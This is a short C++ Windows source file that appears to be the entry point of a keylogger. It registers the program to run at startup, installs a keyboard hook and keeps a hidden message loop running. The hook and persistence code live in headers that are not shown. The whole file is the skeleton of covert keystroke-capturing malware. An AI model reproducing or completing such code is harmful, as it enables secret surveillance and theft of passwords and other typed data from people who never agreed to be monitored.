#include "keyboard.h"
#include "registry.h"
#include <Windows.h>

int APIENTRY wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
{
    registry::add_to_startup();
    keyboard::set_hook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0));
}
